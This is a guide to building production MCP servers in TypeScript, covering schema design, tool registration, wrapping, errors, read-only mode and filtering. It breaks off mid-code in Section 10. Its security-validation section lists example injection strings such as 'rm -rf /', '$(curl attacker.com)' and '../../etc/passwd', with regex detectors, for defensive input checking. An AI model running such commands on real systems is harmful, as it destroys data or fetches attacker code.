# MCP Server Development Guide

A comprehensive guide to building production MCP (Model Context Protocol) servers -- schema design, tool registration, security validation, observability integration, context elicitation, enforcement gates, and debugging strategies. Distilled from hard-won patterns building a 96+ tool production server.

### How to Read This Guide

This guide describes **portable patterns** for building MCP servers that expose backend services to AI assistants. The patterns -- Zod-first schema design, universal tool wrapping, handler composition, input security validation -- apply to any MCP server regardless of the backend it wraps.

Code snippets throughout are **reference implementations** written in TypeScript. When adapting to a different backend:

- **Keep the infrastructure**: schema patterns, tool registration architecture, error handling, security validation, observability wrappers, configuration system
- **Replace the domain layer**: swap the backend client for your service's SDK, replace domain-specific tool handlers with your operations
- **Scale as needed**: the patterns work for a 3-tool server or a 100-tool server -- the universal wrapping architecture ensures cross-cutting concerns apply uniformly

Each section opens with the **pattern** (what and why), then shows the **reference implementation** (how, with self-contained code). The patterns are the point; the code is the proof.

---

## Table of Contents

1. [Why MCP Servers](#1-why-mcp-servers)
2. [Schema Design](#2-schema-design)
3. [Tool Handler Signatures](#3-tool-handler-signatures)
4. [Tool Registration Architecture](#4-tool-registration-architecture)
5. [Universal Tool Wrapping](#5-universal-tool-wrapping)
6. [Error Handling](#6-error-handling)
7. [Security Validation](#7-security-validation)
8. [Read-Only Mode](#8-read-only-mode)
9. [Filtering and Query Patterns](#9-filtering-and-query-patterns)
10. [Parameter Edge Cases](#10-parameter-edge-cases)
11. [Observability Integration](#11-observability-integration)
12. [Transport Modes](#12-transport-modes)
13. [Configuration](#13-configuration)
14. [Debugging MCP Servers](#14-debugging-mcp-servers)
15. [MCP Resources](#15-mcp-resources)
16. [MCP Prompts](#16-mcp-prompts)
17. [Response Builder Pattern](#17-response-builder-pattern)
18. [Tool Factory Pattern](#18-tool-factory-pattern)
19. [Error Bridge Pattern](#19-error-bridge-pattern)
20. [Connection Resilience](#20-connection-resilience)
21. [Parser-Based Query Security](#21-parser-based-query-security)
22. [Progress Reporting](#22-progress-reporting)
23. [Protocol-Integrated Logging](#23-protocol-integrated-logging)
24. [Testing MCP Servers](#24-testing-mcp-servers)
25. [File-System Backed Resources](#25-file-system-backed-resources)
26. [System Catalog Monitoring](#26-system-catalog-monitoring)
27. [Production Checklist](#27-production-checklist)
28. [Progressive Context Elicitation](#28-progressive-context-elicitation)
29. [Operation Enforcement Gates](#29-operation-enforcement-gates)
30. [Tool Registry with Validation](#30-tool-registry-with-validation)

---

## 1. Why MCP Servers

### Pattern

The Model Context Protocol (MCP) defines a JSON-RPC 2.0 interface between AI clients (Claude Desktop, IDEs, custom agents) and backend services. The client sends a `tools/call` request; the server executes the operation and returns structured content. This decoupling means a single MCP server can serve any compliant client without client-specific code.

MCP servers matter because they turn arbitrary backend APIs into composable tools that AI assistants can discover, understand through schema descriptions, and invoke with validated parameters. The protocol handles transport negotiation, tool listing, argument serialization, and error propagation -- the server author focuses on domain logic.

### Reference Implementation

**Transport comparison:**

| Dimension | stdio | SSE (Server-Sent Events) |
|-----------|-------|--------------------------|
| Use case | CLI tools, desktop apps (Claude Desktop) | Web integrations, multi-client scenarios |
| Connection model | Single process, stdin/stdout pipes | HTTP server, long-lived connections |
| Concurrency | One client per process | Multiple clients per server |
| Deployment | Spawned as child process | Standalone HTTP service |
| Debugging | Pipe-based, requires JSON-RPC on stdin | Standard HTTP tools, browser devtools |
| Graceful shutdown | Close transport, exit process | Drain connections, close HTTP server |

**Minimal bootstrap:**

```typescript
// src/index.ts
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { z } from "zod";

const server = new McpServer({
  name: "my-mcp-server",
  version: "1.0.0",
});

server.tool(
  "hello",
  "Returns a greeting",
  { name: z.string().describe("Name to greet") },
  async (args) => ({
    content: [{ type: "text", text: `Hello, ${args.name}!` }],
  }),
);

const transport = new StdioServerTransport();
await server.connect(transport);
```

This is a complete, working MCP server. Every section that follows builds on this foundation.

---

## 2. Schema Design

### Pattern

Schema design is the most critical decision in an MCP server. The MCP SDK uses Zod schemas -- not JSON Schema objects -- to extract tool arguments from incoming JSON-RPC requests. Using raw JSON Schema objects causes parameters to be silently lost. The client sends `{ limit: 50 }`, the handler receives `{}`, defaults apply, and no error is thrown. This failure mode is invisible until you inspect the actual parameter values at runtime.

The root cause is how the SDK processes the `inputSchema` field during tool registration. When it receives a Zod schema, it can properly extract and validate the `params.arguments` object from the JSON-RPC request. When it receives a plain JavaScript object describing a JSON Schema, the extraction step fails silently and the handler receives an empty or malformed arguments object.

A second, subtler failure mode involves `z.union` with string transforms. If you define a parameter as `z.union([z.string().transform(JSON.parse), z.object({}).passthrough()])`, the MCP client sees that strings are acceptable and serializes objects as escaped JSON strings. The server receives `"{\"key\": \"value\"}"` instead of `{"key": "value"}`. Debug logs fill with escape characters, queries fail silently, and the actual cause is buried under layers of misdirection.

### Reference Implementation

**The broken pattern (parameters silently lost):**

```typescript
// src/tools/broken-example.ts -- DO NOT USE
const schema = {
  type: "object",
  properties: {
    limit: { type: "number", minimum: 1, maximum: 100 },
    summary: { type: "boolean" },
  },
};

// Handler receives empty args -- user's limit: 50 becomes limit: undefined
server.tool("my_tool", "description", schema, handler);
```

**The working pattern (parameters flow correctly):**

```typescript
// src/tools/working-example.ts
server.tool("my_tool", "description", {
  limit: z.number().min(1).max(100).optional().describe("Maximum results to return"),
  summary: z.boolean().optional().describe("Whether to include a summary"),
}, handler);
```

**The insidious anti-pattern (escaped JSON strings):**

```typescript
// src/tools/antipattern.ts -- DO NOT USE
const SearchParams = z.object({
  query: z.union([
    z.string().transform((str) => JSON.parse(str)),
    z.object({}).passthrough(),
  ]).optional(),
});

// Client sends: {"query": "{\"range\": {\"@timestamp\": {\"gte\": \"now-24h\"}}}"}
// Instead of:   {"query": {"range": {"@timestamp": {"gte": "now-24h"}}}}
```

**The correct pattern for complex objects:**

```typescript
// src/tools/correct-complex.ts
const SearchParams = z.object({
  index: z.string().optional().describe("Target index name"),
  query: z.object({}).passthrough().optional().describe("Query object"),
  size: z.number().optional().describe("Number of results to return"),
  sort: z.array(z.object({}).passthrough()).optional().describe("Sort criteria"),
  aggs: z.object({}).passthrough().optional().describe("Aggregation definitions"),
});
```

**Zod schema quick reference:**

| Parameter type | Zod pattern | Notes |
|---------------|-------------|-------|
| Required string | `z.string()` | Always add `.describe()` |
| Optional number | `z.number().optional()` | Add `.min()` / `.max()` for bounds |
| Boolean flag | `z.boolean().optional()` | Defaults to `undefined`, not `false` |
| Enum | `z.enum(["a", "b", "c"])` | Exact match only |
| Nested object | `z.object({}).passthrough()` | Allows arbitrary nested keys |
| String array | `z.array(z.string())` | Typed array contents |
| Union (safe) | `z.union([z.string(), z.number()])` | Primitives only -- never mix with transforms |

**Code review checklist:**

- [ ] No raw JSON Schema objects passed to `server.tool()` or `server.registerTool()`
- [ ] No `z.union([z.string().transform(), z.object()])` patterns
- [ ] Complex nested data uses `z.object({}).passthrough()`
- [ ] Every parameter has `.describe()` with a meaningful description
- [ ] Optional parameters use `.optional()`, not `.default()`
- [ ] Debug logging confirms clean object format (no escaped quotes)

---

## 3. Tool Handler Signatures

### Pattern

The MCP SDK calls tool handlers with two arguments: `toolArgs` (the validated user parameters) and `extra` (MCP protocol context including session ID, abort signal, and metadata). Destructuring the wrong argument or using the wrong signature causes parameters to silently map to protocol internals.

The handler should validate arguments immediately using a Zod validator. Even though the SDK performs schema validation during argument extraction, running `validator.parse(args)` at the handler boundary provides an explicit contract, catches edge cases the SDK might miss, and produces clear error messages that map directly to the tool's expected inputs.

### Reference Implementation

```typescript
// src/tools/example-tool.ts
import { z } from "zod";
import { ErrorCode, McpError } from "@modelcontextprotocol/sdk/types.js";

const validator = z.object({
  query: z.string().min(1).describe("Search query string"),
  limit: z.number().min(1).max(100).optional().describe("Maximum results"),
  includeMetadata: z.boolean().optional().describe("Include result metadata"),
});

export function registerSearchTool(server: McpServer, client: BackendClient) {
  const handler = async (toolArgs: Record<string, unknown>, extra: { sessionId?: string; signal?: AbortSignal }) => {
    // Validate and parse arguments at handler boundary
    const params = validator.parse(toolArgs);

    // toolArgs contains: { query: "my search", limit: 10, includeMetadata: true }
    // extra contains:    { sessionId: "abc-123", signal: AbortSignal }

    const results = await client.search(params.query, {
      limit: params.limit ?? 20,
      metadata: params.includeMetadata ?? false,
    });

    return {
      content: [{
        type: "text" as const,
        text: JSON.stringify(results, null, 2),
      }],
    };
  };

  server.tool(
    "backend_search",
    "Search the backend for matching records",
    validator.shape,
    handler,
  );
}
```

**What each argument contains:**

| Argument | Contents | Example fields |
|----------|----------|---------------|
| `toolArgs` | User-provided parameters, validated against the Zod schema | `{ query: "test", limit: 10 }` |
| `extra` | MCP protocol context injected by the SDK | `{ sessionId, signal, _meta }` |

---

## 4. Tool Registration Architecture

### Pattern

As tool count grows, a flat list of registrations in `index.ts` becomes unmanageable. The registration function pattern solves this: each tool module exports a function with signature `(server, client) => void` that registers itself. A central barrel function calls all registration functions, and the server object flows through unchanged.

Category-based module organization keeps related tools together. A search category contains full-text search, count, scroll, and multi-search. A document category contains CRUD operations. This mirrors how users think about the backend's capabilities and makes it easy to find the right file when debugging.

### Reference Implementation

**Tool module structure:**

```
src/tools/
  index.ts                    # Central barrel -- registerAllTools()
  core/
    search.ts                 # registerSearchTool()
    list_resources.ts         # registerListResourcesTool()
  document/
    get_document.ts           # registerGetDocumentTool()
    index_document.ts         # registerIndexDocumentTool()
    update_document.ts        # registerUpdateDocumentTool()
    delete_document.ts        # registerDeleteDocumentTool()
  admin/
    get_cluster_health.ts     # registerGetClusterHealthTool()
    get_settings.ts           # registerGetSettingsTool()
```

**Registration function pattern:**

```typescript
// src/tools/core/list_resources.ts
import { z } from "zod";

type ToolRegistrationFunction = (server: McpServer, client: BackendClient) => void;

const validator = z.object({
  limit: z.number().min(1).max(1000).optional().describe("Maximum resources to return"),
  offset: z.number().min(0).optional().describe("Pagination offset"),
});

export const registerListResourcesTool: ToolRegistrationFunction = (server, client) => {
  const handler = async (toolArgs: Record<string, unknown>) => {
    const params = validator.parse(toolArgs);
    const resources = await client.listResources({
      limit: params.limit ?? 100,
      offset: params.offset ?? 0,
    });
    return {
      content: [{ type: "text" as const, text: JSON.stringify(resources, null, 2) }],
    };
  };

  server.tool("backend_list_resources", "List available resources", validator.shape, handler);
};
```

**Central barrel:**

```typescript
// src/tools/index.ts
import { registerSearchTool } from "./core/search.js";
import { registerListResourcesTool } from "./core/list_resources.js";
import { registerGetDocumentTool } from "./document/get_document.js";
import { registerIndexDocumentTool } from "./document/index_document.js";
// ... more imports

export function registerAllTools(server: McpServer, client: BackendClient): void {
  registerSearchTool(server, client);
  registerListResourcesTool(server, client);
  registerGetDocumentTool(server, client);
  registerIndexDocumentTool(server, client);
  // ... more registrations
}
```

**SDK version considerations:**

The MCP SDK has evolved its registration API. Earlier versions used `server.tool(name, description, schema, handler)`. Later versions introduced `server.registerTool(name, config, handler)` where `config` bundles title, description, and input schema. Check your SDK version's API surface and standardize on one pattern across all tools. The universal wrapping pattern (next section) accommodates either signature by overriding the method you standardize on.

### Scaling Beyond 20 Tools: 4-Layer Module Organization

The 1-file-per-tool structure above works for small servers. Past ~20 tools, it breaks down -- tool definitions mix with business logic, parameter schemas are duplicated between tools, and AI-facing descriptions (often 30-70 lines each) clutter handler files.

The 4-layer pattern separates concerns within each category:

```
src/tools/{category}/
  tools.ts       -- Tool definitions (name, method, description, params reference)
  parameters.ts  -- Zod validation schemas (reusable across tools)
  prompts.ts     -- AI-facing descriptions (rich documentation for each tool)
  operations.ts  -- Business logic (API calls, transformations, error handling)
```

**Why each layer exists:**

| Layer | Responsibility | Why separate? |
|-------|---------------|---------------|
| `tools.ts` | Maps method names to handlers, schemas, descriptions | Single source of truth for tool registration |
| `parameters.ts` | Zod schemas with `.describe()` on every field | Schemas are reusable across create/update/list tools |
| `prompts.ts` | AI-facing documentation (30-70 lines per tool) | Descriptions are substantial enough to dominate handler files |
| `operations.ts` | Business logic, API calls, response building | Testable independently from tool registration |

**Shared schemas across categories:**

Common validators (pagination, time ranges, ID formats) live in a shared utility file and are imported by category-specific parameter files:

```typescript
// src/tools/shared/parameters.ts
import { z } from "zod";

export const PaginationParams = z.object({
  size: z.number().min(1).max(1000).optional().describe("Page size (1-1000)"),
  offset: z.number().min(0).optional().describe("Pagination offset"),
});

export const TimeRangeParam = z.enum(["15M", "1H", "6H", "12H", "24H", "7D"])
  .optional()
  .describe("Relative time range for queries");

export const ResourceId = z.string().uuid().describe("Resource UUID");
```

```typescript
// src/tools/analytics/parameters.ts
import { z } from "zod";
import { PaginationParams, TimeRangeParam } from "../shared/parameters.js";

export const QueryRequestsParams = PaginationParams.extend({
  timeRange: TimeRangeParam,
  statusCodes: z.array(z.number()).optional().describe("Filter by HTTP status codes"),
});
```

Each category exports a barrel function that returns its tools as typed objects. The central registry (Section 30) aggregates all categories and validates uniqueness at startup.

---

## 5. Universal Tool Wrapping

### Pattern

Cross-cutting concerns -- observability, security validation, error normalization, metrics collection -- apply to every tool. Implementing them in each handler is error-prone and ensures they drift apart over time. The universal wrapping pattern overrides the server's registration method to intercept all tools at the point of registration, wrapping each handler with shared behavior automatically.

This is a single-point-of-control pattern. When you need to add request logging to all 96 tools, you add it in one place. When a security rule changes, you change it in one place. When you introduce tracing, every tool gets it without modification.

### Reference Implementation

```typescript
// src/tools/index.ts
interface ToolInfo {
  name: string;
  description: string;
  inputSchema: unknown;
}

export function registerAllTools(server: McpServer, client: BackendClient): ToolInfo[] {
  const registeredTools: ToolInfo[] = [];

  // Override registration to intercept all tools
  const originalRegisterTool = server.registerTool.bind(server);
  server.registerTool = (name: string, config: ToolConfig, handler: ToolHandler) => {
    // Track registered tools
    registeredTools.push({
      name,
      description: config.description || config.title || "",
      inputSchema: config.inputSchema,
    });

    // Determine if security validation is needed
    const readOnlyTools = ["backend_search", "backend_list_resources", "backend_get_health"];
    const shouldValidateSecurity = !readOnlyTools.includes(name);

    // Build handler pipeline: innermost first
    let enhancedHandler = handler;

    // Layer 1: Observability (innermost -- captures actual execution)
    enhancedHandler = async (toolArgs: unknown, extra: unknown) => {
      return traceToolExecution(name, toolArgs, extra, handler);
    };

    // Layer 2: Security validation (outermost for write tools)
    if (shouldValidateSecurity) {
      enhancedHandler = withSecurityValidation(name, enhancedHandler);
    }

    return originalRegisterTool(name, config, enhancedHandler);
  };

  // Register all tools -- they automatically get enhancements
  registerSearchTool(server, client);
  registerListResourcesTool(server, client);
  registerGetDocumentTool(server, client);
  // ... all other registration calls

  return registeredTools;
}
```

**Handler composition order matters.** The outermost wrapper runs first, the innermost runs last (closest to the actual handler). A typical order:

1. **Security validation** (reject bad inputs before any work)
2. **Read-only mode check** (block writes before execution)
3. **Observability/tracing** (capture the execution itself)
4. **Error normalization** (catch and format errors from the handler)

The `registeredTools` array serves double duty: it powers the `tools/list` MCP response and provides a runtime inventory for debugging and monitoring.

---

## 6. Error Handling

### Pattern

MCP defines structured error responses using `McpError` with specific `ErrorCode` values. The protocol distinguishes between client errors (bad parameters, missing resources) and server errors (backend failures, timeouts). Returning the correct error code helps AI clients decide whether to retry, reformulate, or report the failure to the user.

Zod validation errors and runtime execution errors require different handling. A Zod error means the client sent invalid parameters -- that is an `InvalidParams` error. A backend timeout is an `InternalError`. A request for a resource that does not exist is an `InvalidRequest`. Conflating these makes it harder for clients to respond appropriately.

### Reference Implementation

**Error taxonomy:**

| Error type | `ErrorCode` | When to use | Example |
|-----------|-------------|-------------|---------|
| Validation | `InvalidParams` | Zod parse failure, missing required field, out-of-range value | `limit: -5` |
| Execution | `InternalError` | Backend timeout, connection failure, unexpected runtime error | Database connection lost |
| Not found | `InvalidRequest` | Requested resource does not exist | Document ID not in index |
| Permission | `InvalidRequest` | Operation blocked by access control or read-only mode | Write attempt in read-only mode |

**Error handling pattern:**

```typescript
// src/tools/document/get_document.ts
import { ErrorCode, McpError } from "@modelcontextprotocol/sdk/types.js";
import { z } from "zod";

const validator = z.object({
  id: z.string().min(1).describe("Document identifier"),
  collection: z.string().min(1).describe("Collection name"),
});

const handler = async (toolArgs: Record<string, unknown>) => {
  let params: z.infer<typeof validator>;

  try {
    params = validator.parse(toolArgs);
  } catch (error) {
    if (error instanceof z.ZodError) {
      const details = error.issues.map((i) => `${i.path.join(".")}: ${i.message}`).join("; ");
      throw new McpError(ErrorCode.InvalidParams, `Invalid parameters: ${details}`);
    }
    throw error;
  }

  try {
    const document = await client.getDocument(params.collection, params.id);

    if (!document) {
      throw new McpError(
        ErrorCode.InvalidRequest,
        `Document '${params.id}' not found in collection '${params.collection}'`,
      );
    }

    return {
      content: [{ type: "text" as const, text: JSON.stringify(document, null, 2) }],
    };
  } catch (error) {
    if (error instanceof McpError) throw error;
    throw new McpError(
      ErrorCode.InternalError,
      `Failed to retrieve document: ${error instanceof Error ? error.message : String(error)}`,
    );
  }
};
```

**Thrown error vs returned content:**

| Approach | When to use | Client behavior |
|----------|-------------|-----------------|
| `throw new McpError(...)` | Unrecoverable failures, bad inputs | Client sees error response, may retry or reformulate |
| `return { content: [{ type: "text", text: "No results found" }] }` | Empty results, informational outcomes | Client treats as successful response with information |

Use thrown errors for genuine failures. Use returned content for "nothing matched" or "operation completed with warnings" scenarios where the tool functioned correctly but the result set is empty or partial.

### Contextual Error Troubleshooting

Beyond classifying errors, production servers should auto-generate troubleshooting guidance based on the operation context and HTTP status code. The AI client receives actionable tips it can relay to the user or use to self-correct.

**Error context objects:**

```typescript
// src/utils/error-handling.ts
interface ErrorContext {
  operation: string;
  resource?: string;
  resourceId?: string;
  troubleshooting: string[];
}

class EnrichedError extends Error {
  constructor(
    message: string,
    public readonly context: ErrorContext,
    public readonly statusCode?: number,
  ) {
    super(message);
  }
}
```

**`withErrorContext()` higher-order wrapper:**

A curried function that wraps API calls with automatic error context enrichment:

```typescript
// src/utils/error-handling.ts
function withErrorContext<T>(
  operation: string,
  resource?: string,
  resourceId?: string,
) {
  return async (apiCall: () => Promise<T>): Promise<T> => {
    try {
      return await apiCall();
    } catch (error: unknown) {
      const statusCode = extractStatusCode(error);
      const tips = generateTroubleshootingTips(statusCode, operation, resource);
      throw new EnrichedError(
        getErrorMessage(error),
        { operation, resource, resourceId, troubleshooting: tips },
        statusCode,
      );
    }
  };
}
```

**Status-code-aware troubleshooting tips:**

| Status | Generated tips | Rationale |
|--------|---------------|-----------|
| 401 | "Verify authentication token validity", "Check if token has expired" | Token issues are the most common 401 cause |
| 403 | "Verify permissions for this operation", "Check resource-level access" | Permission scoping is often misconfigured |
| 404 | "Verify the resource exists", "Use the list operation to confirm the ID" | Typos in UUIDs are common |
| 429 | "Rate limit exceeded -- implement backoff", "Reduce request frequency" | Client needs to self-throttle |
| 500 | "Backend internal error -- retry after delay", "Check backend service status" | Transient failures are retryable |

**Operation-specific tips:**

The generator also adds operation-aware guidance:

```typescript
function generateTroubleshootingTips(
  statusCode: number | undefined,
  operation: string,
  resource?: string,
): string[] {
  const tips: string[] = [];

  // Status-code tips (shown above)
  switch (statusCode) {
    case 401: tips.push("Verify authentication token validity"); break;
    case 404: tips.push(`Verify the ${resource || "resource"} ID is correct`); break;
    // ...
  }

  // Operation-specific tips
  if (operation.includes("create")) {
    tips.push("Verify all required fields are provided");
    tips.push("Ensure referenced entities exist");
  }
  if (operation.includes("delete")) {
    tips.push("Check if the resource has dependencies that prevent deletion");
  }

  return tips;
}
```

**AI client presentation:**

When the AI client receives an error response with troubleshooting tips, it can present them as a numbered list to the user or use them to automatically retry with corrected parameters.

---

## 7. Security Validation

### Pattern

MCP tool inputs come from AI assistants that relay user instructions. Those instructions can contain injection attacks -- SQL injection in query fields, command injection in shell-executed parameters, path traversal in file paths, XSS in string values that render in UIs. A security validation layer between argument parsing and handler execution catches these before they reach the backend.

The validation must be domain-aware. A wildcard `*` in a search pattern is legitimate. The same `*` in an SQL query parameter is suspicious. Security rules that lack domain context produce false positives that break legitimate operations, leading developers to disable validation entirely -- the worst outcome.

### Reference Implementation

**Threat categories:**

| Category | Pattern examples | Risk |
|----------|-----------------|------|
| SQL injection | `'; DROP TABLE --`, `1 OR 1=1` | Data destruction, unauthorized access |
| Command injection | `; rm -rf /`, `$(curl attacker.com)` | Arbitrary code execution |
| Path traversal | `../../etc/passwd`, `..\\windows\\system32` | File system access |
| XSS | `<script>alert(1)</script>`, `javascript:` | Client-side code execution |
| NoSQL injection | `{$gt: ""}`, `{$ne: null}` | Query manipulation |

**SecurityEnhancer pattern:**

```typescript
// src/utils/securityEnhancer.ts
interface SecurityViolation {
  field: string;
  category: string;
  pattern: string;
  value: string;
}

const injectionPatterns: Record<string, RegExp[]> = {
  sql_injection: [
    /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER)\b.*\b(FROM|INTO|TABLE|WHERE)\b)/i,
    /('|")\s*(OR|AND)\s*('|"|\d)/i,
    /(--|#|\/\*)/,
  ],
  command_injection: [
    /[;&|`$]|\$\(/,
    /\b(eval|exec|system|spawn)\b/i,
  ],
  path_traversal: [
    /\.\.[/\\]/,
    /~[/\\]/,
  ],
  xss: [
    /<script[\s>]/i,
    /javascript\s*:/i,
    /on\w+\s*=/i,
  ],
};

function validateStringInput(value: string, field: string, context: ValidationContext): SecurityViolation[] {
  const violations: SecurityViolation[] = [];

  for (const [category, patterns] of Object.entries(injectionPatterns)) {
    // Apply domain-specific exemptions
    if (context.exemptions?.some((e) => e.category === category && e.fieldPattern.test(field))) {
      continue;
    }

    for (const pattern of patterns) {
      if (pattern.test(value)) {
        violations.push({ field, category, pattern: pattern.source, value });
      }
    }
  }

  return violations;
}
```

**Domain-specific exemptions:**

```typescript
// src/utils/securityEnhancer.ts
interface SecurityExemption {
  category: string;
  fieldPattern: RegExp;
  reason: string;
}

// Each backend defines its legitimate patterns
const domainExemptions: SecurityExemption[] = [
  {
    category: "command_injection",
    fieldPattern: /index|pattern|resource/i,
    reason: "Wildcard patterns like 'logs-*' are legitimate resource identifiers",
  },
  {
    category: "sql_injection",
    fieldPattern: /query|filter|search/i,
    reason: "Query DSL fields contain structured query syntax, not raw SQL",
  },
];
```

**Integration with tool wrapping:**

```typescript
// src/utils/securityEnhancer.ts
export function withSecurityValidation(toolName: string, handler: ToolHandler): ToolHandler {
  return async (toolArgs: unknown, extra: unknown) => {
    const violations = validateToolArgs(toolArgs, { exemptions: domainExemptions });

    if (violations.length > 0) {
      const details = violations.map((v) => `${v.field}: ${v.category} detected`).join("; ");
      throw new McpError(ErrorCode.InvalidParams, `Security validation failed for ${toolName}: ${details}`);
    }

    return handler(toolArgs, extra);
  };
}
```

---

## 8. Read-Only Mode

### Pattern

Production environments often require AI agents to observe but not modify. Read-only mode classifies every tool as either a read operation or a write operation and blocks writes at the tool wrapper level. Two sub-modes serve different operational needs: **strict mode** throws an error and stops execution; **warning mode** logs the attempt and allows it through, useful for auditing before enforcing.

Read-only mode integrates with the universal tool wrapping layer (Section 5). It runs before the handler executes, so blocked operations never reach the backend. The tool classification is a simple list lookup -- when you add a new tool, you decide whether it is read or write.

### Reference Implementation

**Operation classification:**

```typescript
// src/utils/readOnlyMode.ts
type ReadOnlyBehavior = "strict" | "warning";

interface ReadOnlyConfig {
  enabled: boolean;
  behavior: ReadOnlyBehavior;
}

const readOnlyTools = new Set([
  "backend_search",
  "backend_list_resources",
  "backend_get_document",
  "backend_get_health",
  "backend_get_settings",
  "backend_count",
]);

function isReadOnly(toolName: string): boolean {
  return readOnlyTools.has(toolName);
}
```

**Enforcement wrapper:**

```typescript
// src/utils/readOnlyMode.ts
export function withReadOnlyCheck(
  toolName: string,
  config: ReadOnlyConfig,
  handler: ToolHandler,
): ToolHandler {
  if (!config.enabled) return handler;
  if (isReadOnly(toolName)) return handler;

  return async (toolArgs: unknown, extra: unknown) => {
    if (config.behavior === "strict") {
      throw new McpError(
        ErrorCode.InvalidRequest,
        `Tool '${toolName}' is a write operation and is blocked in read-only mode`,
      );
    }

    // Warning mode: log and allow
    logger.warn("Write operation in read-only mode", {
      tool: toolName,
      args: toolArgs,
      mode: "warning",
    });

    return handler(toolArgs, extra);
  };
}
```

**Integration with the wrapper pipeline (Section 5):**

```typescript
// In registerAllTools, add as Layer 3 between security and tracing:
if (!isReadOnly(name) && readOnlyConfig.enabled) {
  enhancedHandler = withReadOnlyCheck(name, readOnlyConfig, enhancedHandler);
}
```

---

## 9. Filtering and Query Patterns

### Pattern

Many MCP tools expose list or search operations that benefit from structured filtering. Rather than accepting raw query strings (which invite injection and are hard to validate), a filter interface provides a typed, composable, and backend-agnostic way to express query criteria. The pattern separates filter construction from filter execution -- tools build filter arrays, and the backend client translates them to its native query language.

### Reference Implementation

**Filter interface:**

```typescript
// src/types.ts
interface Filter {
  field: string;
  operator: "eq" | "in" | "not_in" | "contains" | "gt" | "lt" | "gte" | "lte";
  value: unknown;
}

interface FilteredQuery {
  filters: Filter[];
  timeRange?: string;
  limit?: number;
  offset?: number;
}

interface FilteredResponse<T> {
  metadata: {
    total: number;
    filtered: number;
    appliedFilters: Filter[];
  };
  results: T[];
}
```

**FilterBuilder with fluent API:**

```typescript
// src/utils/filterBuilder.ts
class FilterBuilder {
  private filters: Filter[] = [];

  eq(field: string, value: unknown): this {
    this.filters.push({ field, operator: "eq", value });
    return this;
  }

  in(field: string, values: unknown[]): this {
    this.filters.push({ field, operator: "in", value: values });
    return this;
  }

  notIn(field: string, values: unknown[]): this {
    this.filters.push({ field, operator: "not_in", value: values });
    return this;
  }

  contains(field: string, substring: string): this {
    this.filters.push({ field, operator: "contains", value: substring });
    return this;
  }

  range(field: string, min?: unknown, max?: unknown): this {
    if (min !== undefined) this.filters.push({ field, operator: "gte", value: min });
    if (max !== undefined) this.filters.push({ field, operator: "lte", value: max });
    return this;
  }

  build(): Filter[] {
    return [...this.filters];
  }

  clear(): this {
    this.filters = [];
    return this;
  }
}
```

**Filter validation:**

```typescript
// src/utils/filterValidation.ts
function validateFilters(
  filters: Filter[],
  supportedFields: string[],
  supportedOperators: string[],
): { valid: boolean; errors: string[] } {
  const errors: string[] = [];

  for (const filter of filters) {
    if (!supportedFields.includes(filter.field)) {
      errors.push(`Unsupported field: ${filter.field}`);
    }
    if (!supportedOperators.includes(filter.operator)) {
      errors.push(`Unsupported operator: ${filter.operator}`);
    }
    if (filter.value === undefined || filter.value === null) {
      errors.push(`Filter value cannot be null for field: ${filter.field}`);
    }
    if (["in", "not_in"].includes(filter.operator) && !Array.isArray(filter.value)) {
      errors.push(`Operator '${filter.operator}' requires an array value for field: ${filter.field}`);
    }
  }

  return { valid: errors.length === 0, errors };
}
```

**FilterComposer for logical operations:**

```typescript
// src/utils/filterComposer.ts
class FilterComposer {
  static and(...filterGroups: Filter[][]): Filter[] {
    return filterGroups.flat();
  }

  static or(field: string, values: unknown[]): Filter {
    return { field, operator: "in", value: values };
  }

  static not(field: string, values: unknown[]): Filter {
    return { field, operator: "not_in", value: values };
  }

  static range(field: string, min?: unknown, max?: unknown): Filter[] {
    const filters: Filter[] = [];
    if (min !== undefined) filters.push({ field, operator: "gt", value: min });
    if (max !== undefined) filters.push({ field, operator: "lt", value: max });
    return filters;
  }
}

// Usage
const filters = FilterComposer.and(
  [FilterComposer.or("status", ["active", "pending"])],
  [FilterComposer.not("tags", ["internal", "deprecated"])],
  FilterComposer.range("created_at", "2024-01-01", "2024-12-31"),
);
```

**Pagination interfaces:**

```typescript
// src/types.ts
interface PaginatedQuery extends FilteredQuery {
  page?: number;
  pageSize?: number;
  cursor?: string;
}

interface PaginatedResponse<T> extends FilteredResponse<T> {
  pagination: {
    page: number;
    pageSize: number;
    totalPages: number;
    hasNext: boolean;
    hasPrevious: boolean;
    nextCursor?: string;
  };
}
```

---

## 10. Parameter Edge Cases

### Pattern

MCP clients serialize parameters in ways that do not always match what TypeScript expects. Numbers arrive as strings. Booleans arrive as `"true"`. Empty inputs arrive as `{}` or `undefined` rather than the expected defaults. Comma-separated lists arrive as single strings. These edge cases are predictable and should be handled systematically rather than discovered in production.

The MCP SDK's serialization behavior differs subtly between versions and between client implementations (Claude Desktop, custom agents, web integrations). A defensive tool handler anticipates these variations and normalizes inputs before processing.

### Reference Implementation

**Empty input detection:**

```typescript
// src/utils/paramHelpers.ts
function isEmptyInput(value: unknown): boolean {
  if (value === null || value === undefined) return true;
  if (typeof value === "object" && Object.keys(value as object).length === 0) return true;
  if (typeof value === "string" && value.trim() === "") return true;
  return false;
}

// Usage in handler
const query = isEmptyInput(params.query) ? { match_all: {} } : params.query;
```

**Comma-separated value parsing:**

```typescript
// src/utils/paramHelpers.ts
function parseCommaSeparated(value: string | string[] | undefined): string[] {
  if (!value) return [];
  if (Array.isArray(value)) return value;
  return value.split(",").map((v) => v.trim()).filter(Boolean);
}

// Usage: params.resources = "users,orders,products"
// Result: ["users", "orders", "products"]
```

**Number and boolean coercion helpers:**

```typescript
// src/utils/zodHelpers.ts
import { z } from "zod";

// Coerce string "50" to number 50
const coerceNumber = z.union([z.number(), z.string().transform(Number)]).pipe(z.number());

// Coerce string "true" to boolean true
const coerceBoolean = z.union([
  z.boolean(),
  z.string().transform((v) => v.toLowerCase() === "true"),
]).pipe(z.boolean());

// Usage in validator
const validator = z.object({
  limit: coerceNumber.min(1).max(100).optional(),
  verbose: coerceBoolean.optional(),
});
```

**Debug logging for format verification:**

```typescript
// src/tools/core/search.ts
const handler = async (toolArgs: Record<string, unknown>) => {
  // Log raw input format during development
  logger.debug("Tool input received", {
    tool: "backend_search",
    argTypes: Object.fromEntries(
      Object.entries(toolArgs).map(([k, v]) => [k, typeof v]),
    ),
    rawArgs: toolArgs,
  });

  const params = validator.parse(toolArgs);

  // Log parsed format to verify coercion worked
  logger.debug("Parsed parameters", {
